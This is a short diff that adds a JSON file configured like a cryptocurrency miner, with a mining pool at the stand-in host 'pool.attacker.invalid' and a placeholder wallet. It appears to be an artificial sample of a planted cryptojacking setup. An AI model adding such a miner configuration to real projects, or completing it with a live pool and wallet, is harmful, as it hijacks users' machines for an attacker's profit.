@@ -1,0 +1,4 @@
+{
+  "donate-level": 1,
+  "pools": [{"url": "pool.attacker.invalid:3333", "user": "WALLET"}]
+}
